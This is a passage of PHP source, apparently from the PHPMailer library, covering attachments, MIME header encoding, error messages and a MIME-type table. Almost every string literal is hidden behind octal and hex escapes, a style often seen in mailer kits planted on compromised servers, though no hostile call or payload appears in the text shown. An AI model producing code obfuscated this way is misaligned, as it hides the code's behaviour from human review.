static::$LE; } public function textLine($value) { return $value . static::$LE; } public function addAttachment($path, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\141\164\164\141\143\x68\x6d\145\156\164") { try { if (!static::isPermittedPath($path) || !@is_file($path)) { throw new Exception($this->lang("\146\151\154\145\x5f\x61\143\143\145\163\163") . $path, self::STOP_CONTINUE); } if ('' == $type) { $type = static::filenameToType($path); } $filename = basename($path); if ('' == $name) { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $name); } catch (Exception $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] == $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = hash("\163\x68\141\62\65\66", serialize($attachment)); if (in_array($inclhash, $incl)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ("\151\x6e\x6c\151\x6e\145" == $disposition and array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\x2d\55\x25\x73\x25\163", $boundary, static::$LE); if (!empty($name)) { $mime[] = sprintf("\103\x6f\x6e\164\145\x6e\164\55\124\171\160\145\72\40\45\163\x3b\40\156\141\x6d\x65\x3d\x22\x25\x73\42\x25\x73", $type, $this->encodeHeader($this->secureHeader($name)), static::$LE); } else { $mime[] = sprintf("\x43\x6f\x6e\164\x65\x6e\164\x2d\124\171\x70\145\72\x20\45\163\x25\163", $type, static::$LE); } if (static::ENCODING_7BIT != $encoding) { $mime[] = sprintf("\x43\x6f\x6e\164\x65\x6e\164\x2d\x54\162\141\156\x73\146\145\x72\x2d\x45\156\143\157\x64\x69\x6e\147\72\x20\x25\163\45\x73", $encoding, static::$LE); } if (!empty($cid)) { $mime[] = sprintf("\x43\157\x6e\164\145\156\x74\x2d\x49\104\72\x20\74\x25\x73\x3e\45\x73", $cid, static::$LE); } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (preg_match("\x2f\133\x20\x5c\x28\134\x29\74\76\100\x2c\x3b\72\134\x22\134\57\134\133\x5c\x5d\134\77\x3d\x5d\x2f", $encoded_name)) { $mime[] = sprintf("\103\x6f\x6e\x74\x65\156\x74\x2d\104\x69\163\160\157\163\x69\164\x69\157\156\72\40\45\163\73\x20\x66\x69\x6c\145\156\x61\155\145\75\42\45\x73\42\45\163", $disposition, $encoded_name, static::$LE . static::$LE); } else { if (!empty($encoded_name)) { $mime[] = sprintf("\x43\x6f\x6e\x74\145\156\164\55\x44\x69\163\x70\x6f\163\151\164\151\x6f\156\72\40\45\163\x3b\40\x66\x69\x6c\x65\156\x61\155\145\x3d\x25\x73\x25\x73", $disposition, $encoded_name, static::$LE . static::$LE); } else { $mime[] = sprintf("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\151\x73\x70\x6f\x73\x69\164\151\157\x6e\x3a\x20\x25\163\x25\163", $disposition, static::$LE . static::$LE); } } } else { $mime[] = static::$LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); } else { $mime[] = $this->encodeFile($path, $encoding); } if ($this->isError()) { return ''; } $mime[] = static::$LE; } } $mime[] = sprintf("\55\55\45\163\x2d\55\45\163", $boundary, static::$LE); return implode('', $mime); } protected function encodeFile($path, $encoding = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($path) || !file_exists($path)) { throw new Exception($this->lang("\146\x69\x6c\x65\x5f\x6f\160\145\156") . $path, self::STOP_CONTINUE); } $file_buffer = file_get_contents($path); if (false === $file_buffer) { throw new Exception($this->lang("\x66\151\154\145\x5f\x6f\160\x65\x6e") . $path, self::STOP_CONTINUE); } $file_buffer = $this->encodeString($file_buffer, $encoding); return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); return ''; } } public function encodeString($str, $encoding = self::ENCODING_BASE64) { $encoded = ''; switch (strtolower($encoding)) { case static::ENCODING_BASE64: $encoded = chunk_split(base64_encode($str), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $encoded = static::normalizeBreaks($str); if (substr($encoded, -strlen(static::$LE)) != static::$LE) { $encoded .= static::$LE; } break; case static::ENCODING_BINARY: $encoded = $str; break; case static::ENCODING_QUOTED_PRINTABLE: $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\x65\156\143\x6f\144\151\156\147") . $encoding); break; } return $encoded; } public function encodeHeader($str, $position = "\164\x65\x78\x74") { $matchcount = 0; switch (strtolower($position)) { case "\160\x68\x72\x61\163\145": if (!preg_match("\57\x5b\x5c\62\60\60\55\x5c\63\x37\67\135\57", $str)) { $encoded = addcslashes($str, "\x0\x2e\56\37\x7f\134\x22"); if ($str == $encoded and !preg_match("\57\x5b\x5e\101\x2d\x5a\141\x2d\172\x30\x2d\71\x21\43\x24\45\x26\x27\x2a\53\x5c\57\75\x3f\136\x5f\140\x7b\174\175\176\x20\55\x5d\x2f", $str)) { return $encoded; } return "\42{$encoded}\42"; } $matchcount = preg_match_all("\57\x5b\x5e\x5c\60\x34\60\134\x30\64\61\134\60\x34\63\x2d\x5c\x31\63\63\x5c\x31\x33\x35\55\134\61\67\x36\135\57", $str, $matches); break; case "\143\x6f\x6d\155\x65\x6e\164": $matchcount = preg_match_all("\57\x5b\50\51\x22\135\57", $str, $matches); case "\x74\145\x78\x74": default: $matchcount += preg_match_all("\57\x5b\x5c\x30\60\60\x2d\x5c\x30\x31\60\134\x30\x31\63\x5c\60\x31\x34\134\x30\61\66\x2d\134\60\x33\x37\x5c\x31\x37\67\x2d\134\63\x37\67\x5d\x2f", $str, $matches); break; } $lengthsub = "\155\x61\x69\x6c" == $this->Mailer ? 13 : 0; $maxlen = static::STD_LINE_LENGTH - $lengthsub; if ($matchcount > strlen($str) / 3) { $encoding = "\102"; $maxlen = static::STD_LINE_LENGTH - $lengthsub - 8 - strlen($this->CharSet); if ($this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\xa"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\xa")); } $encoded = preg_replace("\x2f\x5e\50\56\52\x29\x24\x2f\x6d", "\40\75\77" . $this->CharSet . "\77{$encoding}\77\134\61\77\75", $encoded); } elseif ($matchcount > 0) { $encoding = "\121"; $maxlen = static::STD_LINE_LENGTH - $lengthsub - 8 - strlen($this->CharSet); $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\75" . static::$LE, "\xa", trim($encoded)); $encoded = preg_replace("\57\136\x28\56\x2a\51\x24\57\155", "\40\75\x3f" . $this->CharSet . "\x3f{$encoding}\x3f\x5c\61\x3f\75", $encoded); } elseif (strlen($str) > $maxlen) { $encoded = trim($this->wrapText($str, $maxlen, false)); if ($str == $encoded) { $encoded = trim(chunk_split($str, static::STD_LINE_LENGTH, static::$LE)); } $encoded = str_replace(static::$LE, "\12", trim($encoded)); $encoded = preg_replace("\x2f\136\x28\56\x2a\51\x24\57\155", "\x20\x5c\61", $encoded); } else { return $str; } return trim(static::normalizeBreaks($encoded)); } public function hasMultiBytes($str) { if (function_exists("\155\x62\x5f\x73\164\162\x6c\x65\156")) { return strlen($str) > mb_strlen($str, $this->CharSet); } return false; } public function has8bitChars($text) { return (bool) preg_match("\x2f\133\134\x78\70\60\55\134\170\106\106\x5d\x2f", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\75\77" . $this->CharSet . "\77\102\77"; $end = "\x3f\75"; $encoded = ''; if (null === $linebreak) { $linebreak = static::$LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); ++$lookBack; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } return substr($encoded, 0, -strlen($linebreak)); } public function encodeQP($string) { return static::normalizeBreaks(quoted_printable_encode($string)); } public function encodeQ($str, $position = "\164\145\170\x74") { $pattern = ''; $encoded = str_replace(array("\xd", "\xa"), '', $str); switch (strtolower($position)) { case "\160\150\x72\x61\163\x65": $pattern = "\x5e\101\x2d\x5a\141\x2d\x7a\60\x2d\x39\x21\52\x2b\x5c\57\x20\x2d"; break; case "\x63\157\x6d\x6d\145\x6e\164": $pattern = "\134\x28\134\51\x22"; case "\x74\145\170\x74": default: $pattern = "\134\x30\60\x30\x2d\x5c\60\x31\61\134\60\61\x33\x5c\x30\x31\x34\134\x30\61\x36\55\134\60\63\x37\x5c\60\67\x35\134\x30\x37\x37\x5c\61\63\67\134\61\67\x37\55\134\x33\x37\x37" . $pattern; break; } $matches = array(); if (preg_match_all("\x2f\x5b{$pattern}\135\x2f", $encoded, $matches)) { $eqkey = array_search("\x3d", $matches[0]); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\75"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\x3d" . sprintf("\45\60\62\x58", ord($char)), $encoded); } } return str_replace("\x20", "\x5f", $encoded); } public function addStringAttachment($string, $filename, $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x61\x74\164\x61\x63\x68\x6d\x65\x6e\164") { if ('' == $type) { $type = static::filenameToType($filename); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } public function addEmbeddedImage($path, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\x69\x6e\154\x69\156\145") { if (!static::isPermittedPath($path) || !@is_file($path)) { $this->setError($this->lang("\146\151\x6c\x65\x5f\141\143\143\x65\163\163") . $path); return false; } if ('' == $type) { $type = static::filenameToType($path); } $filename = basename($path); if ('' == $name) { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = self::ENCODING_BASE64, $type = '', $disposition = "\151\156\x6c\151\x6e\145") { if ('' == $type and !empty($name)) { $type = static::filenameToType($name); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); return true; } protected function cidExists($cid) { foreach ($this->attachment as $attachment) { if ("\x69\156\x6c\151\x6e\x65" == $attachment[6] and $cid == $attachment[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ("\151\156\154\x69\x6e\x65" == $attachment[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ("\x61\x74\164\x61\x63\150\x6d\x65\x6e\x74" == $attachment[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, function ($params) use($kind) { return $params[0] != $kind; }); } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\164\x6f"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\143\143"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\x62\x63\143"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($msg) { ++$this->error_count; if ("\x73\x6d\164\160" == $this->Mailer and null !== $this->smtp) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\145\x72\162\157\x72"])) { $msg .= $this->lang("\163\x6d\x74\160\137\145\162\162\x6f\162") . $lasterror["\x65\x72\162\157\162"]; if (!empty($lasterror["\x64\x65\x74\141\x69\x6c"])) { $msg .= "\x20\x44\x65\164\x61\x69\154\x3a\40" . $lasterror["\x64\x65\x74\x61\x69\x6c"]; } if (!empty($lasterror["\163\x6d\164\160\x5f\143\157\x64\x65"])) { $msg .= "\40\123\115\x54\x50\x20\x63\157\x64\145\72\x20" . $lasterror["\163\x6d\x74\160\x5f\x63\157\x64\x65"]; } if (!empty($lasterror["\x73\x6d\164\x70\x5f\143\x6f\x64\145\137\x65\170"])) { $msg .= "\40\101\144\x64\x69\x74\x69\157\156\x61\x6c\x20\x53\x4d\124\120\x20\x69\156\x66\157\x3a\x20" . $lasterror["\x73\155\164\160\x5f\x63\157\144\x65\x5f\x65\x78"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\x44\x2c\x20\152\x20\115\40\131\40\x48\x3a\x69\72\163\40\117"); } protected function serverHostname() { $result = ''; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) and array_key_exists("\x53\x45\x52\x56\x45\122\137\x4e\x41\x4d\x45", $_SERVER)) { $result = $_SERVER["\123\105\x52\x56\x45\x52\137\x4e\x41\x4d\105"]; } elseif (function_exists("\x67\145\x74\x68\x6f\163\x74\156\x61\x6d\x65") and gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\156") !== false) { $result = php_uname("\156"); } if (!static::isValidHost($result)) { return "\154\157\143\x61\154\150\x6f\163\164\56\x6c\x6f\x63\x61\x6c\144\x6f\155\141\x69\x6e"; } return $result; } public static function isValidHost($host) { if (empty($host) or !is_string($host) or strlen($host) > 256) { return false; } if (trim($host, "\x5b\x5d") != $host) { return (bool) filter_var(trim($host, "\x5b\135"), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6); } if (is_numeric(str_replace("\x2e", '', $host))) { return (bool) filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4); } if (filter_var("\150\164\x74\x70\72\57\x2f" . $host, FILTER_VALIDATE_URL)) { return true; } return false; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage("\x65\x6e"); } if (array_key_exists($key, $this->language)) { if ("\x73\155\164\160\x5f\143\x6f\156\x6e\x65\x63\164\x5f\146\141\151\154\145\144" == $key) { return $this->language[$key]; } return $this->language[$key]; } return $key; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($name, $value = null) { if (null === $value) { $this->CustomHeader[] = explode("\72", $name, 2); } else { $this->CustomHeader[] = array($name, $value); } } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\x2f\x28\163\162\143\x7c\x62\141\x63\x6b\x67\x72\x6f\x75\x6e\144\51\x3d\x5b\x22\47\135\50\56\x2a\51\x5b\42\x27\x5d\x2f\125\151", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && "\57" != substr($basedir, -1)) { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { if (preg_match("\43\136\144\141\x74\x61\x3a\x28\151\x6d\141\147\x65\57\x28\x3f\72\x6a\x70\145\x3f\147\x7c\147\151\x66\x7c\160\x6e\147\x29\51\73\x3f\50\x62\x61\163\x65\66\64\x29\x3f\x2c\50\56\53\x29\x23", $url, $match)) { if (count($match) == 4 and static::ENCODING_BASE64 == $match[2]) { $data = base64_decode($match[3]); } elseif ('' == $match[2]) { $data = rawurldecode($match[3]); } else { continue; } $cid = hash("\x73\150\141\62\x35\x36", $data) . "\100\x70\150\x70\155\x61\x69\154\x65\162\56\60"; if (!$this->cidExists($cid)) { $this->addStringEmbeddedImage($data, $cid, "\145\155\142\x65\144" . $imgindex, static::ENCODING_BASE64, $match[1]); } $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\75\x22\143\x69\144\x3a" . $cid . "\x22", $message); continue; } if (!empty($basedir) and strpos($url, "\x2e\56") === false and 0 !== strpos($url, "\x63\151\144\x3a") and !preg_match("\x23\x5e\x5b\x61\55\172\x5d\133\141\55\x7a\x30\x2d\71\x2b\x2e\55\135\x2a\72\x3f\57\57\43\151", $url)) { $filename = basename($url); $directory = dirname($url); if ("\x2e" == $directory) { $directory = ''; } $cid = hash("\x73\x68\141\x32\x35\x36", $url) . "\x40\x70\150\160\x6d\141\151\154\x65\x72\x2e\60"; if (strlen($basedir) > 1 and "\x2f" != substr($basedir, -1)) { $basedir .= "\57"; } if (strlen($directory) > 1 and "\57" != substr($directory, -1)) { $directory .= "\57"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\x2f" . $images[1][$imgindex] . "\x3d\133\x22\47\x5d" . preg_quote($url, "\x2f") . "\133\x22\x27\135\x2f\x55\151", $images[1][$imgindex] . "\x3d\x22\143\151\x64\72" . $cid . "\42", $message); } } } } $this->isHTML(true); $this->Body = static::normalizeBreaks($message); $this->AltBody = static::normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\x54\150\151\163\x20\151\x73\x20\141\x6e\x20\x48\124\x4d\114\x2d\x6f\x6e\154\x79\x20\x6d\145\x73\163\x61\147\x65\x2e\40\124\157\x20\166\x69\x65\x77\x20\x69\x74\x2c\x20\x61\x63\164\151\166\141\164\145\40\x48\x54\x4d\x4c\40\151\156\x20\x79\157\x75\x72\x20\145\x6d\x61\x69\154\x20\141\x70\160\154\151\x63\x61\164\x69\x6f\156\x2e" . static::$LE; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\57\74\50\150\x65\141\x64\174\164\151\x74\x6c\x65\x7c\163\x74\171\x6c\x65\x7c\x73\143\x72\x69\x70\164\51\x5b\136\76\135\52\x3e\x2e\x2a\77\74\x5c\x2f\134\61\76\x2f\x73\151", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\170\x6c" => "\x61\x70\160\x6c\x69\143\141\164\151\x6f\156\57\x65\x78\143\x65\154", "\152\x73" => "\x61\160\x70\154\151\143\x61\x74\x69\157\x6e\57\152\141\x76\141\163\x63\162\151\x70\x74", "\x68\x71\x78" => "\141\160\160\x6c\151\143\141\x74\x69\x6f\x6e\x2f\x6d\141\143\x2d\x62\x69\156\x68\145\170\x34\60", "\x63\x70\x74" => "\141\160\x70\154\151\x63\x61\164\151\157\156\57\x6d\x61\x63\x2d\143\x6f\155\160\141\x63\x74\160\x72\x6f", "\x62\151\x6e" => "\141\160\x70\154\151\143\141\x74\151\157\x6e\x2f\155\x61\x63\142\x69\156\x61\x72\x79", "\144\157\x63" => "\141\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\156\x2f\x6d\163\167\x6f\x72\144", "\167\x6f\162\144" => "\x61\160\x70\x6c\151\x63\141\x74\x69\157\156\x2f\155\163\x77\x6f\162\x64", "\170\154\x73\170" => "\x61\160\160\x6c\x69\x63\x61\164\151\x6f\156\57\x76\x6e\x64\x2e\157\160\145\156\x78\x6d\x6c\146\x6f\x72\155\141\x74\x73\x2d\x6f\x66\146\151\x63\145\x64\157\143\165\155\145\156\164\56\163\x70\x72\145\x61\x64\x73\150\x65\145\164\155\x6c\56\x73\x68\145\145\x74", "\170\154\x74\x78" => "\x61\160\x70\x6c\x69\x63\141\x74\151\x6f\156\57\166\156\144\56\157\x70\x65\x6e\170\x6d\x6c\x66\x6f\x72\155\141\x74\163\55\157\146\146\151\143\x65\144\157\x63\165\155\x65\156\164\x2e\163\x70\162\x65\x61\144\x73\x68\x65\145\x74\155\x6c\56\164\145\x6d\x70\154\141\x74\x65", "\x70\x6f\164\x78" => "\141\160\x70\x6c\x69\143\x61\164\151\157\x6e\x2f\166\x6e\144\56\157\x70\145\x6e\170\155\154\x66\x6f\162\x6d\141\164\x73\55\157\x66\146\x69\143\x65\x64\x6f\x63\x75\155\145\x6e\x74\56\160\162\x65\x73\145\156\x74\x61\164\151\x6f\x6e\x6d\154\x2e\x74\x65\155\160\x6c\x61\164\145", "\160\x70\163\170" => "\x61\160\160\154\x69\x63\x61\x74\151\157\156\57\166\x6e\x64\56\x6f\x70\x65\156\x78\155\x6c\x66\157\x72\155\141\x74\163\x2d\157\146\x66\151\x63\145\144\157\x63\165\155\x65\x6e\x74\x2e\x70\x72\x65\163\x65\x6e\164\141\164\151\157\156\155\154\x2e\163\x6c\x69\x64\x65\163\x68\x6f\x77", "\160\x70\x74\170" => "\x61\160\160\x6c\x69\143\141\164\151\x6f\156\x2f\x76\x6e\x64\56\x6f\160\145\156\170\x6d\154\146\157\162\155\x61\x74\x73\x2d\157\146\x66\x69\x63\x65\144\x6f\143\x75\x6d\x65\x6e\164\x2e\x70\x72\x65\163\145\x6e\x74\x61\x74\151\x6f\x6e\x6d\154\x2e\x70\162\x65\x73\x65\156\x74\x61\x74\x69\157\x6e", "\163\x6c\x64\170" => "\141\x70\x70\154\151\143\141\x74\151\x6f\x6e\57\166\x6e\144\56\157\x70\145\x6e\x78\x6d\154\146\157\x72\155\141\x74\163\x2d\x6f\x66\146\x69\x63\x65\144\157\x63\165\155\x65\x6e\x74\56\160\162\x65\x73\x65\x6e\164\141\x74\x69\x6f\156\155\154\x2e\163\154\151\x64\145", "\144\x6f\143\x78" => "\141\160\x70\154\151\x63\x61\164\151\x6f\x6e\57\x76\156\144\56\x6f\x70\145\x6e\170\x6d\154\146\x6f\x72\x6d\141\164\x73\x2d\x6f\x66\146\151\143\145\144\157\x63\x75\x6d\x65\x6e\x74\x2e\x77\x6f\162\144\x70\x72\157\x63\145\x73\163\x69\156\147\155\x6c\x2e\x64\x6f\x63\165\155\145\x6e\x74", "\144\157\164\170" => "\141\160\160\x6c\x69\143\x61\164\x69\157\156\x2f\166\x6e\x64\x2e\157\160\145\x6e\x78\155\154\146\157\x72\x6d\141\x74\163\x2d\157\146\x66\151\143\x65\x64\x6f\x63\165\155\145\156\164\x2e\167\x6f\162\144\160\162\157\x63\x65\x73\x73\x69\x6e\x67\x6d\154\56\164\x65\x6d\x70\x6c\x61\x74\145", "\170\x6c\x61\x6d" => "\x61\x70\160\154\x69\x63\x61\164\151\x6f\156\57\x76\156\144\56\155\163\x2d\x65\x78\143\x65\x6c\56\141\144\x64\151\156\56\x6d\141\143\162\x6f\105\156\x61\142\154\145\144\56\x31\62", "\170\154\x73\142" => "\x61\160\x70\x6c\151\x63\x61\x74\151\157\x6e\x2f\166\156\x64\56\155\x73\55\145\170\143\145\x6c\56\x73\x68\145\x65\164\x2e\x62\x69\x6e\x61\162\x79\x2e\x6d\x61\143\162\157\105\x6e\x61\142\x6c\145\x64\x2e\61\x32", "\x63\x6c\141\163\x73" => "\141\x70\160\x6c\151\x63\x61\x74\x69\157\156\57\157\x63\164\x65\x74\x2d\163\164\x72\x65\x61\x6d", "\144\154\x6c" => "\141\160\160\154\x69\x63\141\x74\151\157\x6e\57\157\143\x74\x65\x74\x2d\163\164\162\x65\141\x6d", "\144\x6d\x73" => "\141\160\x70\x6c\x69\x63\x61\x74\x69\157\x6e\x2f\157\x63\164\145\x74\x2d\163\x74\x72\145\x61\x6d", "\x65\170\145" => "\141\x70\160\154\151\x63\x61\x74\151\157\x6e\57\x6f\x63\164\145\x74\55\x73\x74\x72\x65\141\155", "\x6c\x68\x61" => "\141\x70\x70\x6c\151\143\x61\164\151\157\x6e\57\157\143\164\x65\164\55\163\164\x72\x65\x61\155", "\x6c\x7a\150" => "\141\x70\160\154\151\x63\141\x74\151\x6f\156\57\x6f\x63\x74\145\164\x2d\163\x74\x72\145\x61\x6d", "\x70\163\x64" => "\141\x70\x70\x6c\x69\143\141\164\151\x6f\156\57\x6f\143\x74\x65\164\x2d\x73\x74\162\145\x61\x6d", "\163\145\141" => "\x61\x70\160\x6c\x69\143\141\x74\x69\x6f\x6e\x2f\x6f\x63\164\145\x74\x2d\x73\164\162\x65\141\155", "\x73\x6f" => "\x61\x70\x70\x6c\x69\143\141\164\151\x6f\x6e\57\x6f\143\164\x65\x74\55\x73\x74\162\145\x61\155", "\x6f\x64\141" => "\141\x70\160\154\x69\x63\x61\x74\x69\157\156\x2f\x6f\144\141", "\x70\144\146" => "\x61\160\160\x6c\151\x63\x61\164\151\x6f\x6e\57\x70\144\146", "\x61\151" => "\x61\160\160\x6c\151\x63\141\x74\151\x6f\156\57\x70\x6f\x73\x74\163\x63\162\x69\160\164", "\145\160\163" => "\141\x70\x70\x6c\151\143\x61\x74\151\x6f\x6e\57\x70\x6f\163\164\163\143\162\151\160\x74", "\x70\163" => "\x61\160\160\154\151\143\x61\164\151\157\x6e\57\x70\x6f\163\x74\163\143\x72\x69\x70\164", "\x73\155\x69" => "\141\x70\x70\x6c\x69\143\x61\164\151\x6f\x6e\x2f\163\x6d\x69\x6c", "\x73\x6d\151\x6c" => "\141\x70\x70\x6c\x69\143\141\164\x69\x6f\156\x2f\x73\x6d\151\154", "\x6d\151\146" => "\x61\160\x70\154\151\x63\x61\164\151\x6f\156\x2f\x76\156\x64\x2e\155\151\x66", "\170\x6c\163" => "\x61\160\160\154\151\143\141\164\151\157\156\x2f\166\x6e\144\x2e\x6d\163\x2d\145\170\x63\145\x6c", "\x70\160\164" => "\x61\x70\160\x6c\151\x63\141\164\x69\157\156\x2f\166\x6e\144\x2e\155\163\55\x70\x6f\167\145\x72\x70\157\x69\x6e\164", "\167\142\x78\155\x6c" => "\x61\160\160\154\151\143\141\164\x69\157\x6e\57\x76\156\x64\56\x77\x61\160\x2e\x77\x62\x78\155\x6c", "\167\155\x6c\x63" => "\x61\160\160\x6c\151\143\x61\164\151\157\156\57\166\156\144\56\x77\x61\x70\x2e\167\155\x6c\x63", "\x64\x63\x72" => "\x61\x70\160\154\x69\x63\x61\x74\151\157\x6e\57\x78\x2d\144\x69\x72\145\x63\164\157\162", "\144\151\162" => "\x61\160\x70\x6c\151\x63\x61\x74\151\x6f\x6e\57\170\55\144\151\x72\145\x63\x74\x6f\x72", "\x64\170\162" => "\141\x70\160\154\151\x63\141\164\x69\157\156\57\x78\55\144\x69\x72\145\x63\164\157\x72", "\x64\x76\151" => "\141\160\x70\154\151\x63\x61\164\151\x6f\156\57\170\x2d\144\166\151", "\x67\x74\x61\162" => "\x61\x70\x70\154\x69\x63\141\x74\x69\x6f\156\x2f\x78\x2d\147\164\141\162", "\x70\x68\160\x33" => "\x61\160\x70\154\x69\143\141\x74\151\157\x6e\57\170\55\150\x74\x74\160\x64\55\x70\x68\160", "\x70\x68\160\64" => "\x61\x70\x70\x6c\151\x63\x61\x74\151\157\156\57\170\x2d\150\x74\x74\x70\x64\x2d\x70\x68\x70", "\x70\x68\160" => "\141\160\160\x6c\151\x63\x61\x74\x69\157\156\x2f\170\55\x68\164\x74\160\144\55\x70\x68\x70", "\x70\x68\x74\x6d\154" => "\x61\160\160\154\x69\x63\141\x74\151\157\156\57\x78\55\x68\x74\x74\160\x64\x2d\160\150\x70", "\160\x68\160\x73" => "\x61\160\160\x6c\x69\x63\x61\164\x69\157\x6e\x2f\x78\55\150\164\x74\x70\144\55\160\150\x70\x2d\163\x6f\x75\162\143\145", "\x73\x77\x66" => "\141\x70\x70\154\151\x63\x61\164\x69\x6f\156\57\x78\55\163\x68\157\143\153\167\141\x76\145\x2d\146\x6c\141\163\150", "\x73\151\x74" => "\x61\x70\160\154\x69\x63\x61\x74\x69\157\x6e\x2f\170\55\x73\x74\x75\146\146\151\x74", "\x74\x61\162" => "\x61\x70\x70\154\x69\143\141\x74\x69\x6f\x6e\x2f\170\55\x74\x61\x72", "\164\147\172" => "\141\x70\160\x6c\x69\143\x61\x74\151\x6f\156\x2f\x78\x2d\x74\141\x72", "\170\x68\164" => "\x61\160\160\154\x69\x63\x61\x74\x69\157\156\x2f\170\150\x74\x6d\x6c\53\x78\x6d\x6c", "\x78\x68\x74\155\154" => "\x61\x70\x70\154\151\143\141\164\151\157\x6e\x2f\170\x68\164\155\154\53\170\155\154", "\x7a\x69\160" => "\x61\x70\160\x6c\x69\x63\x61\x74\x69\157\x6e\x2f\x7a\151\x70", "\155\151\144" => "\x61\165\x64\x69\x6f\x2f\x6d\x69\144\151", "\155\x69\x64\151" => "\141\165\x64\151\157\x2f\155\x69\144\x69", "\x6d\160\62" => "\141\x75\144\x69\x6f\x2f\155\x70\x65\x67", "\155\160\63" => "\141\x75\144\x69\157\57\x6d\x70\x65\x67", "\155\64\141" => "\141\x75\x64\151\157\57\155\160\x34", "\155\x70\x67\141" => "\x61\x75\144\x69\x6f\x2f\x6d\160\145\x67", "\x61\151\146" => "\141\165\144\x69\157\x2f\x78\x2d\x61\151\146\146", "\x61\151\x66\143" => "\x61\165\x64\x69\x6f\57\x78\55\141\x69\146\146", "\x61\151\x66\146" => "\141\x75\144\151\x6f\57\x78\55\141\151\x66\x66", "\162\x61\155" => "\141\x75\144\x69\157\x2f\x78\55\x70\156\55\162\x65\x61\154\x61\x75\x64\x69\157", "\162\x6d" => 